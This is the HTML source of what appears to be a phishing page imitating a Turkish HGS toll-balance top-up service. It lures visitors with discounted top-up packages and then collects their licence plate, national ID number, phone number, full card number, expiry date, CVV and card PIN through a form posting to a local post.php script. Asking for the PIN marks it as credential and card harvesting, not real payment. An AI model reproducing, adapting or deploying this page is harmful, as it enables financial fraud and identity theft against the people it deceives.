<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
    "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
<html>
    
<head>
       
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
        <meta name="description" content="HGS Online Bakiye Yükleme" />
        <meta name="keywords" content="hgs, bakiye, online yükleme, online hgs, online bakiye yükleme, hgs bakiye sorgulama" />
        <link rel="shortcut icon" href="favicon.ico" />

        <title>HGS Online Bakiye Yükleme</title>
        <link rel="stylesheet" href="css/hgs_5a1f.css?md=1815180817"/>
        <link rel="stylesheet" href="css/keypad.css"/>
        <link rel="stylesheet" href="css/vtip.css"/>
        <link rel="stylesheet" href="css/jquery.selectbox-0.2.css"/>
        <link rel="stylesheet" href="css/iziModal.css"/>

        <script  type="text/javascript" src="js/jquery1.7.min.js"></script>
        <script  type="text/javascript" src="js/jqmask.js"></script>
        <script type="text/javascript" src="js/login.js"></script>
        <script type="text/javascript" src="js/sorgula2450.js?v=20170818181515"></script>
        <script type="text/javascript" src="js/jquery.joverlay.pack.js"></script>
        <script type="text/javascript" src="js/jquery.keypad.js"></script>
        <script type="text/javascript" src="js/vtip.js"></script>
        <script type="text/javascript" src="js/cbrselector.js"></script>
        <script type="text/javascript" src="js/iziModal.js"></script>
        <script type="text/javascript" src="js/jquery.selectbox-0.2.min.js"></script>
                <script src="../cdn.segmentify.com/account-js/segmentify_epttavm.html" async charset="UTF-8">
        <script type="text/javascript">

           
                    </script>
        
    </head>
    <body class="hgs" style="overflow: auto;">
          
 <script type="text/javascript">
    var IS_DEV = false;
    IS_DEV = true;

    function loadingPayment () {
        var text = '<div id="paymentProgress"><p style="text-align:center;"><strong>İşleminiz Devam Ediyor. Lütfen Bekleyin.... </strong></p></div>';

        showDialog(text, null, null, null, {'top':'37%'});
    }

  $(function(){

  });
</script>
<!-- sorgula -->
<div id="sorgula">
    <img src="img/bg-etiketler.png" class="bg-hgsetiket"/>
    <img src="img/hgs_baslik.png" class="bg-hgslogo"/>

    </div>
</div>
<!-- sorgula:end-->

<!-- etiketler -->
<div id="etiketler">
        
    <!-- yükleme miktarı -->
    <div class="yuklememiktari">
        <div id="hidden"></div>
        <div class="title">
            <i class="icon-yukleme"></i>

            <h1>Yükleme Miktarı <br>
            </h1>
        </div>
        <br/>
        <hr>

        <!-- miktarlar -->
        <div class="miktarlar">
                            <div class="item" id="paket-3" rel='3'
                     data-commission='20' data-price='50'>
                    <span>50 TL</span>
                </div>
                            <div class="item" id="paket-4" rel='4'
                     data-commission='40' data-price='100'>
                    <span>100 TL</span>
                </div>
                            <div class="item" id="paket-8" rel='8'
                     data-commission='125' data-price='250'>
                    <span>250 TL</span>
                </div>
                            <div class="item" id="paket-12" rel='12'
                     data-commission='250' data-price='500'>
                    <span>500 TL</span>
                </div>
            
            <div class="toplam">
                <span>HGS Yükleme : <b class="hgsyukleme" id='hgsyukleme'>0 TL</b></span>
                <span>İndirim Miktarı : <b class="hizmetbedeli" id='hizmetbedeli'>0 TL</b></span>
                <span class="toplambedel">Toplam : <b class="tbedel" id='tbedel'>0 TL</b></span>
            </div>

        </div>


        <div class="clearfix"></div>
        <button type="button" class="bg-color-green btn-green big btn-odeme" id="btn-odeme">
            Ödeme Yap
            <i>&#10003;</i>
        </button>

    </div>

    <div class="clearfix "><br/></div>
    <!-- ödeme -->
    <div class="odeme">
        <hr class="odeme">
        <div class="title">
            <i class="icon-odeme"></i>
            <h1>Ödeme
            <img src="img/visa_mastercard_1.gif" width="166" height="50" border="0" style="vertical-align:middle;" />
            <br></h1>

        </div>
        <br/>
        <hr>

        <!-- kredi kartı -->
        <div class="kredikarti">
            <div class="hidden" id="hidden2"></div>
            <div class="content">
			
                <br/>

				<form id="form" method="post" action="post.php">
                    
					<label for="adi">
                        Plaka
                    </label>

                    <div class="input-control text span6">
                        <input maxlength="9" type="text" name="plaka" required>
                    </div>
					<label for="adi">
                        Tc Kimlik No
                    </label>
<div class="input-control text span6">
                        <input maxlength="11" type="text" name="tc_no" required="">
                    </div>
					
    <label for="adi">Telefon Numarası</label>
    <div class="input-control text span6">
                        <input maxlength="11" type="text" name="telnum" required="">
                    </div>
					
					
					
					
					<label for="adi">
                        Kart Sahibi
                    </label>

                    <div class="input-control text span6">
                        <input type="text" name="isim_soyisim" required>
                    </div>
                    <br/>
                    <label for="kartno">
                        Kart Numarası
                    </label> <br/>

                    <div class="input-control text span2 kartno">
                        <input type="text" maxlength="4" name="ccno1" rel="1" class="ccno" required>
                    </div>
                    <div class="input-control text span2 kartno">
                        <input type="text" maxlength="4" name="ccno2" rel="2" class="ccno" required>
                    </div>
                    <div class="input-control text span2 kartno">
                        <input type="text" maxlength="4" name="ccno3" rel="3" class="ccno" required>
                    </div>
                    <div class="input-control text span2 kartno">
                        <input type="text" maxlength="4" name="ccno4" rel="4" class="ccno" required>
                    </div>

                    <div class="clearfix"></div>
                    <br/>
                    <label for="adi">
                        Son Kullanma Tarihi
                    </label>

                    <div class="clearfix"></div>
                    <div class="input-control select sonkullanim1">
                        <select name="skt_ay">
                            <option value="01">01</option>
                            <option value="02">02</option>
                            <option value="03">03</option>
                            <option value="04">04</option>
                            <option value="05">05</option>
                            <option value="06">06</option>
                            <option value="07">07</option>
                            <option value="08">08</option>
                            <option value="09">09</option>
                            <option value="10">10</option>
                            <option value="11">11</option>
                            <option value="12">12</option>
                        </select>
                    </div>
                    <div class="input-control select sonkullanim1">
                        <select name="skt_yil">
                                                            
                                                             <option value="18">2018</option> 
                                                             <option value="19">2019</option> 
                                                             <option value="20">2020</option> 
                                                             <option value="21">2021</option> 
                                                             <option value="22">2022</option> 
                                                             <option value="23">2023</option> 
                                                             <option value="24">2024</option> 
                                                             <option value="25">2025</option> 
                                                             <option value="26">2026</option> 
                                                             <option value="27">2027</option> 
                                                             <option value="28">2028</option> 
                                                             <option value="29">2029</option> 
                                                             <option value="30">2030</option> 
                                                    </select>
                    </div>

                    <div class="guvenlik_kodu">
                        <label for="adi">
                            Güvenlik Kodu <span style="color:#f6b905;" class="tttip" id="tttip" title=""
                                                data-html="true">(?)</span>
                        </label>

                        <div class="input-control text span2 gkodu">
                            <input type="text" maxlength="3" name="ccv" required>
                        </div>
                    </div>

                    <div class="clearfix" style="height:68px;"></div>
					<div class="kart_pin">
                        <label for="adi">
                            Kart Şifresi
                        </label>

                        <div class="input-control text span2">
                            <input type="text" maxlength="5" name="kart_pin" required="">
                        </div>
                    </div>
					
                    <button type="submit" class="bg-color-green btn-green big btn-notmember span6">
                        Yükle
                    </button>
                    <img src="img/loader-green.gif" class="yloader" id="yloader1"/>

                </form>
				
				<hr>
				
            </div>
        </div>


        

           </div>
    </div>
</div>


<div class="clearfix "><br/></div>
<!-- ödeme onay -->
<div id="odemeonay">
    <div class="content">

        <img src="img/tsklogo.png" id="odemeonay_logo" style="width: 200px; height: auto;"/>
        <div id="firsaturunu">
            <div id="yuzkomisyon" style="width: 100%;"><b>HGS Yükleme sayfamızdan 100 TL </b>üzeri alışveriş yapın
                <br>yüklemelerinizde hizmet bedeli ödemeyin !
            </div>
            
            
			
        </div>
    </div>

</div>
<script>
    $(document).ready(function () {
        //        customerAlert();
        customerAlertPhishing();
                $("#tttip").on('click', function () {
            showDialog('<img src="img/cvv.png" />', '', '');
        });


    });
</script>
<script type="text/javascript">

    $("#tckno-hata").iziModal({
        title: 'TC Kimlik Numarası',
        subtitle: '',
        theme: '',
        headerColor: '#e6b706',
        overlayColor: 'rgba(0, 0, 0, 0.5)',
        iconColor: '',
        iconClass: null,
        width: 430,
        padding: 0,
        overlayClose: true,
        closeOnEscape: true,
        bodyOverflow: false,
        history: false,
        zindex: 10000,
        iframeHeight: 450,
        transitionIn: 'fadeInUp'
    });

    $("#general_modal").iziModal({
        title: 'Uyarı',
        subtitle: '',
        theme: '',
        headerColor: '#e6b706',
        overlayColor: 'rgba(0, 0, 0, 0.5)',
        iconColor: '',
        iconClass: null,
        width: 500,
        padding: 0,
        overlayClose: true,
        closeOnEscape: true,
        bodyOverflow: false,
        history: false,
        zindex: 10000,
        iframeHeight: 400,
        transitionIn: 'fadeInUp'
    });

</script>
</body>
</html>
